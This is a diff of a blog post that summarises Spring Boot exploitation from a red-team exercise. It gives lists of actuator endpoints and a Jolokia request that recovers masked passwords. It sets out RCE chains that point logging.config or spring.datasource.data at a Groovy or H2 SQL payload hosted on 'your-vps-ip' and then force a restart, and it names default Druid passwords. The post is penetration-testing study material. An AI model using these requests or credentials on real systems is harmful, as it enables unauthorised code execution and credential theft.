@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Tag: struts2 | wh1t3zer</title>
+  <title>Springboot综合利用总结 | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -562,110 +562,584 @@
 </header>
         <!-- 内容区域 -->
         
+ <!-- prismjs 代码高亮 -->
+ 
 
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-tagDetail" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
 
-<div class="tag-header" style="background-image: url('https://pic1.zhimg.com/80/v2-604a15cef201cf177943af2d915eb2e7_1440w.jpg?source=1940ef5c');">
-  <div class="tag-header-title">
-    tag
-  </div>
-  <div class="tag-header-desc">
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/img3.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
-    <span class="title" id="tag-header-desc"></span>
-    <script>
-  function typedFn() {
-    const el = '#tag-header-desc';
-    const type = 'tagDetail';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        Springboot综合利用总结
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2024-08-17 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/Springboot/" class="post-detail-header_category">
+              Springboot
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近有机会作为红队（混子）参加了HW，还是碰到很多企业系统用的都是springboot框架，并且还有可多可少的漏洞可以进行利用，对这个springboot做一个记录复盘。</p>
+<h2 id="0x01漏洞集合"><a href="#0x01漏洞集合" class="headerlink" title="0x01漏洞集合"></a>0x01漏洞集合</h2><h3 id="1、有关端点和接口的信息泄露"><a href="#1、有关端点和接口的信息泄露" class="headerlink" title="1、有关端点和接口的信息泄露"></a>1、有关端点和接口的信息泄露</h3><p>这些端点或者接口可以泄露一些敏感信息，比如在env中可以泄露部分的敏感变量，通过actuator泄露，可以看到可利用的接口列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/metrics</span><br><span class="line">/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、配置不正当导致的泄露"><a href="#2、配置不正当导致的泄露" class="headerlink" title="2、配置不正当导致的泄露"></a>2、配置不正当导致的泄露</h3><p>其实这个泄露跟第一基本上一样，都是通过泄露端点或者接口后进一步访问其他接口路径导致的泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/auditevents</span><br><span class="line">/autoconfig</span><br><span class="line">/beans</span><br><span class="line">/caches</span><br><span class="line">/conditions</span><br><span class="line">/configprops</span><br><span class="line">/docs</span><br><span class="line">/dump</span><br><span class="line">/env</span><br><span class="line">/flyway</span><br><span class="line">/health</span><br><span class="line">/heapdump</span><br><span class="line">/httptrace</span><br><span class="line">/info</span><br><span class="line">/intergrationgraph</span><br><span class="line">/jolokia</span><br><span class="line">/logfile</span><br><span class="line">/loggers</span><br><span class="line">/liquibase</span><br><span class="line">/metrics</span><br><span class="line">/mappings</span><br><span class="line">/prometheus</span><br><span class="line">/refresh</span><br><span class="line">/scheduledtasks</span><br><span class="line">/sessions</span><br><span class="line">/shutdown</span><br><span class="line">/trace</span><br><span class="line">/threaddump</span><br><span class="line">/actuator/auditevents</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/conditions</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/loggers</span><br><span class="line">/actuator/heapdump</span><br><span class="line">/actuator/threaddump</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/scheduledtasks</span><br><span class="line">/actuator/httptrace</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/jolokia</span><br><span class="line">/actuator/hystrix.stream</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、脱敏密码明文"><a href="#3、脱敏密码明文" class="headerlink" title="3、脱敏密码明文"></a>3、脱敏密码明文</h3><p>目标网站需要有&#x2F;jolokia或者&#x2F;actuator&#x2F;jolokia接口，同时使用jolokia-core依赖</p>
+<p><strong>jolokia</strong></p>
+<p>Jolokia 是一种 JMX-HTTP 桥接工具，通常用于将 Java 应用程序中的 JMX（Java Management Extensions）接口通过 HTTP 公开。它可以在多种 Java 应用中使用，包括 Spring Boot 应用程序。</p>
+<p>在 Spring Boot 中，Jolokia 可以作为一个端点集成到 Actuator 中，从而允许开发人员通过 RESTful API 远程监控和管理应用程序。</p>
+<p>1、先通过&#x2F;env接口获得带*号的密码，并复制对应的属性</p>
+<p>2、调用相关Mbean获取明文</p>
+<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、脱敏密码明文"><a href="#4、脱敏密码明文" class="headerlink" title="4、脱敏密码明文"></a>4、脱敏密码明文</h3><h3 id="5、脱敏密码明文"><a href="#5、脱敏密码明文" class="headerlink" title="5、脱敏密码明文"></a>5、脱敏密码明文</h3><h3 id="6、脱敏密码明文"><a href="#6、脱敏密码明文" class="headerlink" title="6、脱敏密码明文"></a>6、脱敏密码明文</h3><h3 id="7、基于SpEL注入的RCE"><a href="#7、基于SpEL注入的RCE" class="headerlink" title="7、基于SpEL注入的RCE"></a>7、基于SpEL注入的RCE</h3><h3 id="8、SpringCloud的SnakeYaml的RCE"><a href="#8、SpringCloud的SnakeYaml的RCE" class="headerlink" title="8、SpringCloud的SnakeYaml的RCE"></a>8、SpringCloud的SnakeYaml的RCE</h3><h3 id="9、eureka中xstream基于反序列化的RCE"><a href="#9、eureka中xstream基于反序列化的RCE" class="headerlink" title="9、eureka中xstream基于反序列化的RCE"></a>9、eureka中xstream基于反序列化的RCE</h3><h3 id="10、jolokia中logback基于JNDI注入的RCE"><a href="#10、jolokia中logback基于JNDI注入的RCE" class="headerlink" title="10、jolokia中logback基于JNDI注入的RCE"></a>10、jolokia中logback基于JNDI注入的RCE</h3><h3 id="11、jolokia中realm基于JNDI注入的RCE"><a href="#11、jolokia中realm基于JNDI注入的RCE" class="headerlink" title="11、jolokia中realm基于JNDI注入的RCE"></a>11、jolokia中realm基于JNDI注入的RCE</h3><h3 id="12、H2数据库设置query属性的RCE-x2F-restart"><a href="#12、H2数据库设置query属性的RCE-x2F-restart" class="headerlink" title="12、H2数据库设置query属性的RCE  &#x2F;restart"></a>12、H2数据库设置query属性的RCE  &#x2F;restart</h3><h3 id="13、h2数据库的控制台基于JNDI注入的RCE"><a href="#13、h2数据库的控制台基于JNDI注入的RCE" class="headerlink" title="13、h2数据库的控制台基于JNDI注入的RCE"></a>13、h2数据库的控制台基于JNDI注入的RCE</h3><h3 id="14、mysql中jdbc基于反序列化的RCE"><a href="#14、mysql中jdbc基于反序列化的RCE" class="headerlink" title="14、mysql中jdbc基于反序列化的RCE"></a>14、mysql中jdbc基于反序列化的RCE</h3><h3 id="15、logging-config的logback基于JNDI的RCE-x2F-restart"><a href="#15、logging-config的logback基于JNDI的RCE-x2F-restart" class="headerlink" title="15、logging.config的logback基于JNDI的RCE  &#x2F;restart"></a>15、logging.config的logback基于JNDI的RCE  &#x2F;restart</h3><h3 id="16、logging-config的groovyRCE-x2F-restart"><a href="#16、logging-config的groovyRCE-x2F-restart" class="headerlink" title="16、logging.config的groovyRCE  &#x2F;restart"></a>16、logging.config的groovyRCE  &#x2F;restart</h3><p>1、可以 POST 请求目标网站的&#x2F;env接口设置属性</p>
+<p>2、可以 POST 请求目标网站的 &#x2F;restart&#96;接口重启应用</p>
+<p>注：1、目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</p>
+<p>​		2、 HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</p>
+<p>​		3、环境中需要存在 groovy 依赖，否则会导致程序异常退出</p>
+<p><strong>托管groovy结尾文件</strong></p>
+<p>并在里面输入要执行的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>设置logging.config属性</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>访问&#x2F;restart接口重启</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221301162.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221301162.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="17、spring-main-source的groovyRCE-x2F-restart"><a href="#17、spring-main-source的groovyRCE-x2F-restart" class="headerlink" title="17、spring.main.source的groovyRCE  &#x2F;restart"></a>17、spring.main.source的groovyRCE  &#x2F;restart</h3><h3 id="18、spring-datasource-data-基于h2数据库的RCE-x2F-restart"><a href="#18、spring-datasource-data-基于h2数据库的RCE-x2F-restart" class="headerlink" title="18、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart"></a>18、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart</h3><p>1、可以POST请求&#x2F;env接口</p>
+<p>2、可以POST请求&#x2F;restart接口</p>
+<p>3、需要存在h2数据库、spring-boot-starter-data-jpa相关依赖</p>
+<p>4、必须出网，否则会程序异常退出</p>
+<p>5、含有畸形h2的sql语法内容文件也会导致程序异常退出</p>
+<p><strong>托管sql文件</strong></p>
+<p>在vps上开一个服务器，存放sql文件进去，便于下载</p>
+<p>sql文件的内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>注：以上的T5在&#x2F;restart一次之后必须要更改，比如T6、T7，否则在T5进行&#x2F;restart后再次执行会导致程序异常退出</p>
+<p><strong>设置spring.datasource.data属性</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>重启应用</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
+<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
+<li><strong>spring-boot-autoconfigure</strong>组件中的<strong>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</strong>文件代码逻辑中会使用 runScripts 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
+</ol>
+<h3 id="19、heapdump文件下载导致敏感信息泄露"><a href="#19、heapdump文件下载导致敏感信息泄露" class="headerlink" title="19、heapdump文件下载导致敏感信息泄露"></a>19、heapdump文件下载导致敏感信息泄露</h3><p>在Spring Boot中，Heapdump主要用于监控和诊断应用程序的内存使用情况，尤其是在处理内存泄漏、内存溢出（OutOfMemoryError）等内存相关问题时。也就是说可以通过工具获取到heapdump的堆栈信息，操作系统、环境变量还有账号密码等敏感信息。</p>
+<h3 id="20、druid数据连接池"><a href="#20、druid数据连接池" class="headerlink" title="20、druid数据连接池"></a>20、druid数据连接池</h3><p>比较大部分的企业都会嵌入druid数据连接池到springboot项目中，用于监控数据库的操作行为、数据源等。一般常为&#x2F;druid&#x2F;index.html或者&#x2F;druid&#x2F;login.html，容易出现弱口令访问或者未授权访问，账号密码一般是admin&#x2F;123456，若依的则是ruoyi&#x2F;123456</p>
+<h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>观察这一系列漏洞可以发现，有几个接口是比较常用的</p>
+<p><strong>&#x2F;env</strong> 、**&#x2F;actuator&#x2F;env**</p>
+<p>常用于泄露环境变量、内网地址、用户名密码信息等</p>
+<p><strong>&#x2F;refresh</strong>、**&#x2F;actuator&#x2F;refresh**</p>
+<p>用于通过POST请求刷新方法实现RCE</p>
+<p><strong>&#x2F;restart</strong>、**&#x2F;actuator&#x2F;restart**</p>
+<p>先通过POST到&#x2F;env接口后，再用POST请求restart接口实现RCE</p>
+<p><strong>&#x2F;jolokia</strong>、**&#x2F;actuator&#x2F;jolokia**</p>
+<p>可以解决在&#x2F;env接口中的星号密码信息问题，通过寻找MBean，触发相关的RCE</p>
+<p><strong>&#x2F;trace</strong>、**&#x2F;actuator&#x2F;httptrace**</p>
+<p>跟踪信息，可能获得管理员的cookies、jwt，请求信息</p>
+<p><strong>&#x2F;heapdump</strong></p>
+<p>可以直接下载heapdump文件，用工具解密里面内容</p>
+<p><strong>&#x2F;druid&#x2F;login.html</strong>、**&#x2F;druid&#x2F;index.html**</p>
+<p>访问数据连接池，获得数据源信息、sql操作日志、session和接口访问日志</p>
+<p>常见弱口令admin&#x2F;123456、ruoyi&#x2F;123456</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Springboot/" class="">
+              Springboot
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>wh1t3zer</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2024/08/17/springboot综合漏洞利用个总结/" target="_blank" title="Springboot综合利用总结">https://wh1t3zer.github.io/2024/08/17/springboot综合漏洞利用个总结/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img8.jpg" class="lazyload placeholder" data-srcset="/medias/img8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2024/08/30/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E5%A4%8D%E7%9B%98/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">国护红队复盘</div>
+      </div>
+      
+      <!-- <div class="content">
+        0x00前言本次HW作为红队方，负责外围打点，这次HW共有近百个单位参与攻击和防守。
+0x01搜集开始时上级发了一份靶标
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img3.jpg" class="lazyload placeholder" data-srcset="/medias/img3.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2024/07/06/UAC%E5%88%9D%E6%8E%A2&Bypass/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">UAC初探&amp;Bypass</div>
+      </div>
+      <!-- <div class="content">
+        0x00概念UAC是windows特有的一个账户权限控制的模块，其全名是user account control。
+部分
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
 </script>
     
-  </div>
-  <div class="mask-box"></div>
-</div>
 
-
-
-<div class="tag">
-  <div class="tag-name">
-    <div class="name" style="background-color: #A3E4D7;">struts2 category</div>
-  </div>
-  <!-- 每一篇文章卡片 -->
-  <!-- hash算法 -->
-
-<section class="posts">
-  
+    <!-- 分享 -->
     
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2023-07-05</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2023/07/05/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">struts2RCE漏洞复现</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
 
-    <i class="iconfont icontag"></i>
-    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/struts2/" rel="tag">struts2</a></li></ul>
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
 
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/struts2-RCE/">struts2| RCE</a>
-</div>
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
 
 
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2023/07/05/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload lazyload placeholder" src="/medias/img16.jpg" class="lazyload placeholder" data-srcset="/medias/img16.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            0x00简介struts2是一个基于java开源的安全中间件，其中
-0x010x02
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2023/07/05/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
